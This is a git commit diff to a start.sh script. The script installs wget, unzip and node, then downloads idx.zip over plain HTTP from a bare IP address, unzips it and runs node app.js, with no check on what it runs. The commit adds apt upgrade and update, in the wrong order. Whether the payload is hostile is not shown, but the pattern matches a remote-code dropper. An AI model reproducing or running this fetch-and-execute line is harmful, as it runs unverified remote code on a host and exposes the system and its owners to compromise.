339723610a3cf5d9592b40ba6abd475488cec29d
SABIR 7718 <s04006241@gmail.com>
2026-02-28 07:56:45 +0000

    Update start.sh to include apt upgrade and update

--- start.sh
+++ start.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-apt install wget && apt install unzip && apt install node -y && wget http://165.227.63.140:7718/idx.zip && unzip idx.zip && node app.js
+apt upgrade && apt update && apt install wget && apt install unzip && apt install node -y && wget http://165.227.63.140:7718/idx.zip && unzip idx.zip && node app.js
